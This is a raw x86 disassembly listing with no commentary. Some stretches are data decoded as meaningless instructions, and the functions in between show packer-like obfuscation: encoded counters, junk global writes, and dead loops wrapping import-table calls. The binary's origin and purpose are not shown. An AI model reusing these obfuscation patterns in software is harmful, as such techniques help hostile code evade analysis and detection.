  40f004:	div    BYTE PTR [ebp+edi*8-0x5f]
  40f008:	rol    edx,0x79
  40f00b:	mov    ah,dl
  40f00d:	std    
  40f00e:	dec    eax
  40f00f:	inc    esp
  40f010:	lock or DWORD PTR [ebx-0x62],edi
  40f014:	push   eax
  40f015:	cmp    DWORD PTR [edx+0xe],esp
  40f018:	xchg   BYTE PTR [ecx-0x4994d019],ch
  40f01e:	enter  0xaca9,0xa3
  40f022:	(bad)  
  40f024:	mov    ecx,0xa1485972
  40f029:	in     al,0x71
  40f02b:	mov    dl,BYTE PTR [ebx-0x7407d50b]
  40f031:	in     al,dx
  40f032:	or     edi,DWORD PTR [esi+0x3ee24b15]
  40f038:	int3   
  40f039:	daa    
  40f03a:	sahf   
  40f03b:	addr16 loopne 0x40efd4
  40f03e:	dec    ecx
  40f03f:	jge    0x40f090
  40f041:	fwait
  40f042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f043:	adc    DWORD PTR [esi-0x63],edi
  40f046:	xchg   ecx,eax
  40f047:	adc    BYTE PTR [eax-0x4e],0x8c
  40f04b:	mov    edx,0x2a85b393
  40f050:	dec    ecx
  40f051:	push   0xffffffc1
  40f053:	and    al,0x58
  40f055:	mov    fs:0x12eef887,eax
  40f05b:	mov    esi,0x1d513531
  40f060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f061:	ret    
  40f062:	sub    eax,0xc4fe5d8
  40f067:	les    ebx,FWORD PTR [edi+0xb]
  40f06a:	les    esi,FWORD PTR [ebx+0x1a]
  40f06d:	imul   ebp,ecx,0x70
  40f070:	mul    DWORD PTR [eax+ebx*4+0x1a3b7e70]
  40f077:	mov    DWORD PTR [ebp+eiz*2+0x60],ebx
  40f07b:	mov    BYTE PTR [eax],0xc4
  40f07e:	jns    0x40f0bf
  40f080:	push   0x76
  40f082:	or     esp,DWORD PTR [eax]
  40f084:	inc    ecx
  40f085:	pop    esi
  40f086:	ret    0x4e49
  40f089:	das    
  40f08a:	mov    ch,0x53
  40f08c:	mov    esp,DWORD PTR [edx+0x4f0b1c23]
  40f092:	jne    0x40f10a
  40f094:	pop    edi
  40f095:	mov    cl,0xc6
  40f097:	jns    0x40f040
  40f099:	in     al,0xc1
  40f09b:	push   ebp
  40f09c:	in     al,dx
  40f09d:	in     al,dx
  40f09e:	jno    0x40f079
  40f0a0:	call   0xd5bd84f9
  40f0a5:	cmp    BYTE PTR [edi-0x10d6d89c],ch
  40f0ab:	jg     0x40f096
  40f0ad:	gs mov ah,0x35
  40f0b0:	inc    ebx
  40f0b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0b2:	lods   eax,DWORD PTR ds:[esi]
  40f0b3:	mov    ebx,0xa8cea19
  40f0b8:	push   0x696cb107
  40f0bd:	call   0xbb48f290
  40f0c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0c3:	daa    
  40f0c4:	les    ebp,FWORD PTR [eax]
  40f0c6:	pop    esi
  40f0c7:	mov    eax,ds:0xd8077356
  40f0cc:	mov    ah,0x5c
  40f0ce:	outs   dx,BYTE PTR ds:[esi]
  40f0cf:	inc    ecx
  40f0d0:	out    0xca,eax
  40f0d2:	mov    edx,0xc7746ee1
  40f0d7:	or     DWORD PTR [edx+0x156fd0c],esp
  40f0dd:	arpl   bx,di
  40f0df:	out    dx,eax
  40f0e0:	pop    ebp
  40f0e1:	inc    ecx
  40f0e2:	dec    eax
  40f0e3:	or     edi,DWORD PTR [esi+0x9353d06]
  40f0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0ea:	out    0xe3,al
  40f0ec:	loope  0x40f164
  40f0ee:	bound  ebx,QWORD PTR [ebp-0x2579da36]
  40f0f4:	or     eax,0xf9b19016
  40f0f9:	sahf   
  40f0fa:	push   0xff355289
  40f0ff:	imul   esp,DWORD PTR [ecx-0x1ca380a8],0xbb80310
  40f109:	push   ebx
  40f10a:	and    eax,DWORD PTR [ebp+0x18]
  40f10d:	repz mov gs,WORD PTR [eax]
  40f110:	js     0x40f166
  40f112:	dec    edx
  40f113:	inc    edi
  40f114:	xchg   ebp,eax
  40f115:	and    ch,BYTE PTR [edx+edx*2]
  40f118:	cmp    ebp,DWORD PTR [esp+eiz*2+0x7e]
  40f11c:	dec    esi
  40f11d:	push   edi
  40f11e:	xchg   edi,eax
  40f11f:	mov    esp,0xdddded18
  40f124:	idiv   BYTE PTR [ebx]
  40f126:	push   ebp
  40f127:	push   edi
  40f128:	clc    
  40f129:	sub    eax,DWORD PTR [edi+0x79]
  40f12c:	loopne 0x40f0e8
  40f12e:	xlat   BYTE PTR ds:[ebx]
  40f12f:	popf   
  40f130:	fld    QWORD PTR [ebx+0x0]
  40f133:	and    eax,0x238a23b6
  40f138:	stc    
  40f139:	dec    ecx
  40f13a:	call   0x75ccba14
  40f13f:	or     al,0x3b
  40f141:	lock mov eax,DWORD PTR [ebp-0x4]
  40f145:	je     0x40cd96
  40f14b:	xor    eax,edx
  40f14d:	add    eax,ecx
  40f14f:	mov    ecx,DWORD PTR [ebp+0xc]
  40f152:	imul   eax,ecx
  40f155:	add    eax,DWORD PTR [ebp+0x8]
  40f158:	mov    DWORD PTR [ebp+0xc],eax
  40f15b:	mov    eax,DWORD PTR [ebp+0xc]
  40f15e:	pop    esi
  40f15f:	leave  
  40f160:	ret    0x8
  40f163:	push   ebp
  40f164:	mov    ebp,esp
  40f166:	push   ecx
  40f167:	or     eax,0x63ef
  40f16c:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  40f173:	adc    DWORD PTR ds:0x429004,0x1463
  40f17d:	mov    eax,DWORD PTR [ebp-0x4]
  40f180:	mov    edx,DWORD PTR [ebp+0x10]
  40f183:	mov    ecx,DWORD PTR ds:0x42b010
  40f189:	add    DWORD PTR ds:0x42a000,ecx
  40f18f:	mov    ecx,0x7510896
  40f194:	neg    DWORD PTR ds:0x42b010
  40f19a:	xor    eax,ecx
  40f19c:	add    eax,0x3272dd
  40f1a1:	and    DWORD PTR ds:0x429010,0xb4c
  40f1ab:	mov    DWORD PTR [edx],eax
  40f1ad:	and    DWORD PTR ds:0x42c01c,0x0
  40f1b7:	jmp    0x40f1c9
  40f1bc:	mov    edx,DWORD PTR ds:0x42c01c
  40f1c2:	inc    edx
  40f1c3:	mov    DWORD PTR ds:0x42c01c,edx
  40f1c9:	cmp    DWORD PTR ds:0x42c01c,0x1b
  40f1d0:	jae    0x40f1f8
  40f1d6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f1dd:	jne    0x40f1f3
  40f1e3:	push   0x22f2
  40f1e8:	push   0x42e134
  40f1ed:	call   DWORD PTR ds:0x42ed5d
  40f1f3:	jmp    0x40f1bc
  40f1f8:	mov    eax,DWORD PTR [ebp+0xc]
  40f1fb:	or     DWORD PTR ds:0x42a004,ecx
  40f201:	xor    eax,ecx
  40f203:	push   esi
  40f204:	mov    esi,DWORD PTR [ebp+0x10]
  40f207:	mov    edx,0x3272dd
  40f20c:	add    eax,edx
  40f20e:	mov    DWORD PTR [esi+0x4],eax
  40f211:	mov    eax,DWORD PTR [ebp+0x14]
  40f214:	mov    esi,DWORD PTR [ebp+0x10]
  40f217:	mov    DWORD PTR [esi+0x8],eax
  40f21a:	mov    eax,DWORD PTR [ebp+0x18]
  40f21d:	mov    esi,DWORD PTR [ebp+0x10]
  40f220:	mov    DWORD PTR [esi+0xc],eax
  40f223:	mov    eax,DWORD PTR [ebp+0x1c]
  40f226:	mov    esi,DWORD PTR [ebp+0x10]
  40f229:	mov    DWORD PTR [esi+0x10],eax
  40f22c:	mov    eax,DWORD PTR [ebp+0x8]
  40f22f:	xor    eax,ecx
  40f231:	add    eax,edx
  40f233:	pop    esi
  40f234:	leave  
  40f235:	ret    0x18
  40f238:	push   ebp
  40f239:	mov    ebp,esp
  40f23b:	sub    esp,0xa4
  40f241:	adc    eax,0x77b8
  40f246:	mov    ecx,DWORD PTR [ebp+0x8]
  40f249:	adc    DWORD PTR ds:0x429000,edi
  40f24f:	mov    eax,0x8a89
  40f254:	adc    DWORD PTR ds:0x42900c,0x429028
  40f25e:	xor    ax,WORD PTR [ecx+0x20]
  40f262:	mov    ecx,DWORD PTR ds:0x429028
  40f268:	and    DWORD PTR ds:0x42b00c,ecx
  40f26e:	mov    ecx,0x3b4c
  40f273:	dec    DWORD PTR ds:0x42d014
  40f279:	add    ax,cx
  40f27c:	movzx  eax,ax
  40f27f:	add    ecx,0x1468
  40f285:	mov    DWORD PTR [ebp-0x18],eax
  40f288:	mov    BYTE PTR [ebp-0x1],0x7d
  40f28c:	mov    ecx,DWORD PTR ds:0x412000
  40f292:	mov    ecx,DWORD PTR [ecx]
  40f294:	adc    DWORD PTR ds:0x42d01c,ecx
  40f29a:	lea    eax,[ebp-0x1]
  40f29d:	sub    DWORD PTR ds:0x42c014,0xae5
  40f2a7:	mov    DWORD PTR [ebp-0x10],eax
  40f2aa:	mov    al,BYTE PTR [ebp-0x1]
  40f2ad:	inc    ecx
  40f2ae:	mov    ecx,DWORD PTR [ebp-0x10]
  40f2b1:	xor    al,0x71
  40f2b3:	adc    DWORD PTR ds:0x42b018,0x264
  40f2bd:	sub    al,0xb
  40f2bf:	adc    DWORD PTR ds:0x429014,0x5cc7
  40f2c9:	mov    BYTE PTR [ecx],al
  40f2cb:	mov    DWORD PTR ds:0x42b004,0x11
  40f2d5:	cmp    DWORD PTR ds:0x42b004,0x0
  40f2dc:	je     0x40f31e
  40f2e2:	cmp    DWORD PTR ds:0x42b004,0x1d
  40f2e9:	jne    0x40f304
  40f2ef:	push   0x42e000
  40f2f4:	push   DWORD PTR [ebp-0x18]
  40f2f7:	push   0x0
  40f2f9:	push   0x4fbc
  40f2fe:	call   DWORD PTR ds:0x42ed61
  40f304:	mov    eax,ds:0x42b004
  40f309:	dec    eax
  40f30a:	mov    ds:0x42b004,eax
  40f30f:	jmp    0x40f2d5
  40f314:	sbb    DWORD PTR ds:0x42d010,0x7483
  40f31e:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40f325:	push   ebx
  40f326:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  40f32d:	mov    ecx,DWORD PTR [ebp-0x14]
  40f330:	push   esi
  40f331:	and    DWORD PTR ds:0x42a01c,0x0
  40f33b:	jmp    0x40f34d
  40f340:	mov    esi,DWORD PTR ds:0x42a01c
  40f346:	inc    esi
  40f347:	mov    DWORD PTR ds:0x42a01c,esi
  40f34d:	cmp    DWORD PTR ds:0x42a01c,0x1f
  40f354:	jae    0x40f3f6
  40f35a:	cmp    DWORD PTR ds:0x42a01c,0x21
  40f361:	jne    0x40f377
  40f367:	push   0x42c010
  40f36c:	push   0x562e
  40f371:	call   DWORD PTR ds:0x42ed65
  40f377:	jmp    0x40f340
  40f37c:	and    DWORD PTR ds:0x42d01c,0x0
  40f386:	xor    eax,eax
  40f388:	or     eax,DWORD PTR ds:0x42d01c
  40f38e:	inc    eax
  40f38f:	mov    ds:0x42d01c,eax
  40f394:	cmp    DWORD PTR ds:0x42d01c,0xb
  40f39b:	jne    0x40f3c1
  40f3a1:	push   DWORD PTR [ebp-0x24]
  40f3a4:	push   0x42a010
  40f3a9:	push   0x78c6
  40f3ae:	push   0x42e134
  40f3b3:	push   DWORD PTR [ebp-0x1c]
  40f3b6:	push   0x1e85
  40f3bb:	call   DWORD PTR ds:0x42ed6d
  40f3c1:	cmp    DWORD PTR ds:0x42d01c,0xa
  40f3c8:	jne    0x40f3d9
  40f3ce:	mov    eax,ds:0x42d01c
  40f3d3:	inc    eax
  40f3d4:	mov    ds:0x42d01c,eax
  40f3d9:	cmp    DWORD PTR ds:0x42d01c,0x18
  40f3e0:	jb     0x40f386
  40f3e6:	xor    eax,eax
  40f3e8:	xor    eax,DWORD PTR ds:0x411ff4
  40f3ee:	mov    eax,DWORD PTR [eax]
  40f3f0:	or     DWORD PTR ds:0x42b018,eax
  40f3f6:	mov    eax,0x7510896
  40f3fb:	sbb    DWORD PTR ds:0x42a01c,edx
  40f401:	xor    ecx,eax
  40f403:	or     esi,DWORD PTR ds:0x42a008
  40f409:	mov    esi,0x3272dd
  40f40e:	push   edi
  40f40f:	add    ecx,esi
  40f411:	jmp    0x40f435
  40f416:	mov    DWORD PTR ds:0x42a01c,0x2feb
  40f420:	mov    dl,BYTE PTR [ebp-0x1]
  40f423:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40f42a:	mov    DWORD PTR ds:0x42b01c,0x5ed5
  40f434:	inc    ecx
  40f435:	cmp    ecx,0x40
  40f438:	jb     0x40f416
  40f43e:	mov    DWORD PTR ds:0x429018,0x19
  40f448:	cmp    DWORD PTR ds:0x429018,0x0
  40f44f:	je     0x40f47c
  40f455:	cmp    DWORD PTR ds:0x429018,0x1d
  40f45c:	jne    0x40f468
  40f462:	call   DWORD PTR ds:0x42ed71
  40f468:	mov    edx,DWORD PTR ds:0x429018
  40f46e:	dec    edx
  40f46f:	mov    DWORD PTR ds:0x429018,edx
  40f475:	jmp    0x40f448
  40f47a:	not    edx
  40f47c:	mov    edx,DWORD PTR [ebp-0x14]
  40f47f:	sub    DWORD PTR ds:0x42c00c,0x42b014
  40f489:	xor    edx,eax
  40f48b:	adc    DWORD PTR ds:0x429024,0x42a018
  40f495:	add    edx,esi
  40f497:	mov    DWORD PTR ds:0x42b014,0x72c9
  40f4a1:	jmp    0x40f5bb
  40f4a6:	dec    DWORD PTR ds:0x429014
  40f4ac:	mov    edi,DWORD PTR [ebp+0x8]
  40f4af:	adc    ecx,DWORD PTR ds:0x42a018
  40f4b5:	mov    ecx,0x8a89
  40f4ba:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40f4bf:	and    DWORD PTR ds:0x429008,0x0
  40f4c9:	jmp    0x40f4dd
  40f4ce:	xor    edi,edi
  40f4d0:	xor    edi,DWORD PTR ds:0x429008
  40f4d6:	inc    edi
  40f4d7:	mov    DWORD PTR ds:0x429008,edi
  40f4dd:	cmp    DWORD PTR ds:0x429008,0x10
  40f4e4:	jae    0x40f511
  40f4ea:	cmp    DWORD PTR ds:0x429008,0x19
  40f4f1:	jne    0x40f502
  40f4f7:	push   0x429018
  40f4fc:	call   DWORD PTR ds:0x42ed75
  40f502:	jmp    0x40f4ce
  40f507:	adc    DWORD PTR ds:0x42a010,0x20e4
  40f511:	mov    edi,0x3b4c
  40f516:	sub    DWORD PTR ds:0x42a014,0x7a80
  40f520:	add    cx,di
  40f523:	movzx  ecx,cx
  40f526:	neg    DWORD PTR ds:0x42b000
  40f52c:	mov    DWORD PTR [ebp-0x10],ecx
  40f52f:	and    DWORD PTR ds:0x42a000,0x0
  40f539:	jmp    0x40f54b
  40f53e:	mov    ecx,DWORD PTR ds:0x42a000
  40f544:	inc    ecx
  40f545:	mov    DWORD PTR ds:0x42a000,ecx
  40f54b:	cmp    DWORD PTR ds:0x42a000,0x1f
  40f552:	jae    0x40f57e
  40f558:	cmp    DWORD PTR ds:0x42a000,0x26
  40f55f:	jne    0x40f573
  40f565:	push   0x3463
  40f56a:	push   DWORD PTR [ebp-0x1c]
  40f56d:	call   DWORD PTR ds:0x42ed35
  40f573:	jmp    0x40f53e
  40f578:	or     ecx,0x6b07
  40f57e:	mov    ecx,DWORD PTR [ebp+0x8]
  40f581:	movzx  ecx,WORD PTR [ecx+edx*4]
  40f585:	mov    DWORD PTR ds:0x42a010,0x2266
  40f58f:	xor    ecx,0x8a89
  40f595:	add    ecx,edi
  40f597:	mov    DWORD PTR ds:0x42b018,0x196a
  40f5a1:	mov    edi,DWORD PTR [ebp-0x10]
  40f5a4:	mov    DWORD PTR ds:0x42a018,0x15ce
  40f5ae:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40f5b5:	mov    ecx,0x651b
  40f5ba:	inc    edx
  40f5bb:	mov    ecx,DWORD PTR [ebp-0x18]
  40f5be:	mov    DWORD PTR ds:0x429020,0x7b55
  40f5c8:	cmp    edx,ecx
  40f5ca:	jne    0x40f4a6
  40f5d0:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5d3:	mov    edx,DWORD PTR [ebp+0x10]
  40f5d6:	adc    DWORD PTR ds:0x429008,0x429014
  40f5e0:	xor    ecx,eax
  40f5e2:	mov    DWORD PTR ds:0x429028,0x35c1
  40f5ec:	add    ecx,esi
  40f5ee:	sub    DWORD PTR ds:0x429024,0xd80
  40f5f8:	mov    DWORD PTR [edx],ecx
  40f5fa:	add    ecx,0x553e
  40f600:	mov    ecx,DWORD PTR [ebp-0x14]
  40f603:	add    DWORD PTR ds:0x42901c,0xd2d
  40f60d:	xor    ecx,eax
  40f60f:	add    ecx,esi
  40f611:	mov    DWORD PTR ds:0x42d008,0x74bc
  40f61b:	mov    DWORD PTR [ebp-0x20],ecx
  40f61e:	mov    DWORD PTR ds:0x42a004,edi
  40f624:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  40f62b:	mov    DWORD PTR ds:0x429018,0x1d37
  40f635:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  40f63c:	mov    DWORD PTR ds:0x42901c,0x14b9
  40f646:	mov    DWORD PTR [ebp-0x1c],0xf89c95b5
  40f64d:	mov    DWORD PTR ds:0x42c000,edx
  40f653:	mov    ecx,DWORD PTR [ebp-0xc]
  40f656:	mov    DWORD PTR ds:0x42a018,0x1347
  40f660:	mov    DWORD PTR [ebp+0x8],ecx
  40f663:	mov    DWORD PTR ds:0x429014,0x4ea
  40f66d:	jmp    0x40f78d
  40f672:	sbb    DWORD PTR ds:0x42a018,0x42c008
  40f67c:	mov    ecx,DWORD PTR [ebp+0x8]
  40f67f:	and    edx,DWORD PTR ds:0x42c00c
  40f685:	mov    edx,DWORD PTR [ebp-0x8]
  40f688:	xor    DWORD PTR ds:0x42a008,0x42a018
  40f692:	xor    ecx,eax
  40f694:	xor    edx,eax
  40f696:	sub    ecx,edx
  40f698:	sub    edx,0x6561
  40f69e:	sub    ecx,esi
  40f6a0:	xor    ecx,eax
  40f6a2:	mov    DWORD PTR [ebp+0x8],ecx
  40f6a5:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6a8:	mov    edx,DWORD PTR [ebp-0x64]
  40f6ab:	sub    DWORD PTR ds:0x42901c,0x6b48
  40f6b5:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6bc:	movzx  edx,WORD PTR ds:0x42900c
  40f6c3:	adc    DWORD PTR ds:0x42c00c,edx
  40f6c9:	mov    DWORD PTR [ebp-0x64],ecx
  40f6cc:	sbb    DWORD PTR ds:0x42a018,0x1891
  40f6d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6d9:	dec    edx
  40f6da:	mov    edx,DWORD PTR [ebp-0x60]
  40f6dd:	lea    ecx,[edx+ecx*1+0x5708f2]
  40f6e4:	mov    DWORD PTR [ebp-0x60],ecx
  40f6e7:	sbb    DWORD PTR ds:0x42900c,0x79ab
  40f6f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f6f4:	add    DWORD PTR ds:0x42a01c,edi
  40f6fa:	mov    edx,DWORD PTR [ebp-0x5c]
  40f6fd:	lea    ecx,[edx+ecx*1+0x5708f3]
  40f704:	mov    DWORD PTR [ebp-0x5c],ecx
  40f707:	inc    DWORD PTR ds:0x429004
  40f70d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f710:	sbb    DWORD PTR ds:0x42d018,edx
  40f716:	mov    edx,DWORD PTR [ebp-0x58]
  40f719:	and    DWORD PTR ds:0x42c008,0x42b004
  40f723:	lea    ecx,[edx+ecx*1+0x5708f0]
  40f72a:	dec    edx
  40f72b:	mov    DWORD PTR [ebp-0x58],ecx
  40f72e:	movzx  ecx,WORD PTR ds:0x429000
  40f735:	adc    DWORD PTR ds:0x42c008,ecx
  40f73b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f73e:	mov    edx,DWORD PTR [ebp-0x54]
  40f741:	add    DWORD PTR ds:0x42d004,0x42a014
  40f74b:	lea    ecx,[edx+ecx*1+0x5708f1]
  40f752:	mov    DWORD PTR [ebp-0x54],ecx
  40f755:	xor    DWORD PTR ds:0x42d01c,0x80b
  40f75f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f762:	and    DWORD PTR ds:0x42d008,0x7467
  40f76c:	mov    edx,DWORD PTR [ebp-0x50]
  40f76f:	or     DWORD PTR ds:0x42c004,0x42a000
  40f779:	lea    ecx,[edx+ecx*1+0x5708fe]
  40f780:	add    DWORD PTR ds:0x42c010,0x5221
  40f78a:	mov    DWORD PTR [ebp-0x50],ecx
  40f78d:	or     ecx,DWORD PTR ds:0x429028
  40f793:	mov    ecx,DWORD PTR [ebp+0x8]
  40f796:	xor    ecx,eax
  40f798:	add    ecx,esi
  40f79a:	mov    DWORD PTR ds:0x42c004,0x633d
  40f7a4:	jne    0x40f672
  40f7aa:	jmp    0x411e4d
  40f7af:	neg    DWORD PTR ds:0x42901c
  40f7b5:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7b8:	mov    edx,DWORD PTR [ebp-0x8]
  40f7bb:	sub    DWORD PTR ds:0x429008,0x429014
  40f7c5:	xor    ecx,eax
  40f7c7:	xor    edx,eax
  40f7c9:	sbb    DWORD PTR ds:0x42c018,0x25ac
  40f7d3:	sub    ecx,edx
  40f7d5:	or     DWORD PTR ds:0x42d000,0x429014
  40f7df:	sub    ecx,esi
  40f7e1:	xor    ecx,eax
  40f7e3:	mov    DWORD PTR ds:0x42b018,0x1de
  40f7ed:	mov    DWORD PTR [ebp-0x1c],ecx
  40f7f0:	mov    DWORD PTR ds:0x42c000,0x7d6a
  40f7fa:	mov    ecx,DWORD PTR [ebp-0xc]
  40f7fd:	mov    DWORD PTR ds:0x429028,0x9e0
  40f807:	mov    DWORD PTR [ebp+0x8],ecx
  40f80a:	jmp    0x40f91d
  40f80f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f812:	mov    edx,DWORD PTR [ebp-0x8]
  40f815:	xor    ecx,eax
  40f817:	adc    DWORD PTR ds:0x42c008,ecx
  40f81d:	xor    edx,eax
  40f81f:	xor    DWORD PTR ds:0x42900c,0x3273
  40f829:	sub    ecx,edx
  40f82b:	sub    ecx,esi
  40f82d:	or     edi,edi
  40f82f:	xor    ecx,eax
  40f831:	mov    DWORD PTR [ebp+0x8],ecx
  40f834:	and    DWORD PTR ds:0x429020,0x0
  40f83e:	jmp    0x40f850
  40f843:	mov    edi,DWORD PTR ds:0x429020
  40f849:	inc    edi
  40f84a:	mov    DWORD PTR ds:0x429020,edi
  40f850:	cmp    DWORD PTR ds:0x429020,0x1b
  40f857:	jae    0x40f8a8
  40f85d:	cmp    DWORD PTR ds:0x429020,0x6
  40f864:	jne    0x40f87f
  40f86a:	push   0x6ce2
  40f86f:	push   0x42d018
  40f874:	push   0x18a6
  40f879:	call   DWORD PTR ds:0x42ed39
  40f87f:	cmp    DWORD PTR ds:0x429020,0x5
  40f886:	jne    0x40f899
  40f88c:	mov    edi,DWORD PTR ds:0x429020
  40f892:	inc    edi
  40f893:	mov    DWORD PTR ds:0x429020,edi
  40f899:	jmp    0x40f843
  40f89e:	and    DWORD PTR ds:0x42b004,0x42b01c
  40f8a8:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8ab:	mov    edx,DWORD PTR [ebp+0x8]
  40f8ae:	and    DWORD PTR ds:0x42d010,0x0
  40f8b8:	mov    edi,DWORD PTR ds:0x42d010
  40f8be:	inc    edi
  40f8bf:	mov    DWORD PTR ds:0x42d010,edi
  40f8c5:	cmp    DWORD PTR ds:0x42d010,0x5
  40f8cc:	jne    0x40f8e2
  40f8d2:	push   0x42e11d
  40f8d7:	push   0x42e110
  40f8dc:	call   DWORD PTR ds:0x42ed3d
  40f8e2:	cmp    DWORD PTR ds:0x42d010,0x4
  40f8e9:	jne    0x40f8fc
  40f8ef:	mov    edi,DWORD PTR ds:0x42d010
  40f8f5:	inc    edi
  40f8f6:	mov    DWORD PTR ds:0x42d010,edi
  40f8fc:	cmp    DWORD PTR ds:0x42d010,0x15
  40f903:	jb     0x40f8b8
  40f909:	imul   edx,edx,0x5708f2
  40f90f:	xor    ecx,eax
  40f911:	add    ecx,esi
  40f913:	lea    ecx,[ebp+ecx*4-0x64]
  40f917:	mov    edi,DWORD PTR [ecx]
  40f919:	add    edx,edi
  40f91b:	mov    DWORD PTR [ecx],edx
  40f91d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f920:	xor    ecx,eax
  40f922:	add    ecx,esi
  40f924:	jne    0x40f80f
  40f92a:	mov    ecx,DWORD PTR [ebp-0x20]
  40f92d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f934:	mov    dl,BYTE PTR [ebp-0x1]
  40f937:	cmp    cl,dl
  40f939:	je     0x411dae
  40f93f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f942:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40f949:	mov    edx,DWORD PTR [ebp+0xc]
  40f94c:	cmp    cl,BYTE PTR [edx]
  40f94e:	jne    0x411e5f
  40f954:	mov    ecx,DWORD PTR [ebp-0x14]
  40f957:	mov    edx,DWORD PTR [ebp+0xc]
  40f95a:	movsx  edx,BYTE PTR [edx]
  40f95d:	xor    ecx,eax
  40f95f:	add    ecx,esi
  40f961:	cmp    edx,ecx
  40f963:	mov    ecx,DWORD PTR [ebp-0xc]
  40f966:	mov    DWORD PTR [ebp+0x8],ecx
  40f969:	mov    ecx,DWORD PTR [ebp+0x8]
  40f96c:	je     0x411ed9
  40f972:	jmp    0x40f9a7
  40f977:	mov    ecx,DWORD PTR [ebp+0x8]
  40f97a:	mov    edx,DWORD PTR [ebp-0x8]
  40f97d:	xor    ecx,eax
  40f97f:	xor    edx,eax
  40f981:	sub    ecx,edx
  40f983:	sub    ecx,esi
  40f985:	xor    ecx,eax
  40f987:	mov    DWORD PTR [ebp+0x8],ecx
  40f98a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f98d:	mov    edx,DWORD PTR [ebp+0x8]
  40f990:	xor    ecx,eax
  40f992:	imul   edx,edx,0x5708f2
  40f998:	add    ecx,esi
  40f99a:	lea    ecx,[ebp+ecx*4-0x64]
  40f99e:	mov    edi,DWORD PTR [ecx]
  40f9a0:	add    edx,edi
  40f9a2:	mov    DWORD PTR [ecx],edx
  40f9a4:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9a7:	xor    ecx,eax
  40f9a9:	add    ecx,esi
  40f9ab:	jne    0x40f977
  40f9b1:	mov    ecx,DWORD PTR [ebp-0x14]
  40f9b4:	mov    edx,DWORD PTR [ebp+0x8]
  40f9b7:	xor    ecx,eax
  40f9b9:	xor    edx,eax
  40f9bb:	add    ecx,esi
  40f9bd:	add    edx,esi
  40f9bf:	cmp    ecx,edx
  40f9c1:	jae    0x411df3
  40f9c7:	lea    edx,[ecx-0x3272dd]
  40f9cd:	mov    DWORD PTR [ebp-0x18],edx
  40f9d0:	mov    edi,DWORD PTR [ebp-0x18]
  40f9d3:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  40f9da:	lea    edx,[ebp-0x24]
  40f9dd:	mov    DWORD PTR [ebp-0x10],edx
  40f9e0:	mov    edx,DWORD PTR [ebp-0x10]
  40f9e3:	add    DWORD PTR [edx],0x705fa0f
  40f9e9:	mov    ebx,DWORD PTR [ebp-0x10]
  40f9ec:	xor    edi,eax
  40f9ee:	add    edi,DWORD PTR [ebx]
  40f9f0:	lea    edx,[ebp+ecx*4-0x64]
  40f9f4:	mov    ebx,DWORD PTR [edx]
  40f9f6:	xor    edi,ebx
  40f9f8:	mov    DWORD PTR [edx],edi
  40f9fa:	mov    edx,DWORD PTR [ebp+0x8]
  40f9fd:	xor    edx,eax
  40f9ff:	inc    ecx
  40fa00:	inc    DWORD PTR [ebp-0x18]
  40fa03:	add    edx,esi
  40fa05:	jmp    0x411da1
  40fa0a:	fstp   DWORD PTR [ebx]
  40fa0c:	sti    
  40fa0d:	sar    DWORD PTR [ebx-0x4f],1
  40fa10:	jnp    0x40fa2d
  40fa12:	inc    esi
  40fa13:	xchg   ebx,eax
  40fa14:	or     ch,BYTE PTR [eax]
  40fa16:	add    eax,0x744b0030
  40fa1b:	retf   0x7a7a
  40fa1e:	sti    
  40fa1f:	pop    edi
  40fa20:	jp     0x40fa9c
  40fa22:	leave  
  40fa23:	mov    edx,0x14c76d8b
  40fa28:	(bad)  
  40fa2a:	push   ss
  40fa2b:	clc    
  40fa2c:	das    
  40fa2d:	push   ss
  40fa2e:	pop    edi
  40fa2f:	ficomp WORD PTR [ebp-0x3d9eddc5]
  40fa35:	stos   BYTE PTR es:[edi],al
  40fa36:	push   ds
  40fa37:	ins    BYTE PTR es:[edi],dx
  40fa38:	jp     0x40f9f7
  40fa3a:	mov    edi,0x7d41c8ca
  40fa3f:	fwait
  40fa40:	mov    edi,0x5a6f9184
  40fa45:	mov    ?,WORD PTR [ebx+0x71b75c66]
  40fa4b:	pusha  
  40fa4c:	push   ebx
  40fa4d:	pop    eax
  40fa4e:	fisub  WORD PTR [edi-0x19]
  40fa51:	pop    ebx
  40fa52:	cdq    
  40fa53:	push   edx
  40fa54:	push   ss
  40fa55:	and    eax,0x2281cd87
  40fa5a:	jl     0x40faae
  40fa5c:	push   esp
  40fa5d:	pop    ds
  40fa5e:	sbb    eax,0x89cdfd44
  40fa63:	lods   al,BYTE PTR ds:[esi]
  40fa64:	add    esp,DWORD PTR [eax+0x7f]
  40fa67:	xchg   edx,eax
  40fa68:	shl    bl,1
  40fa6a:	imul   ebp,edx,0x68c94b0f
  40fa70:	iret   
  40fa71:	ret    
  40fa72:	bound  edx,QWORD PTR [edi-0x6e]
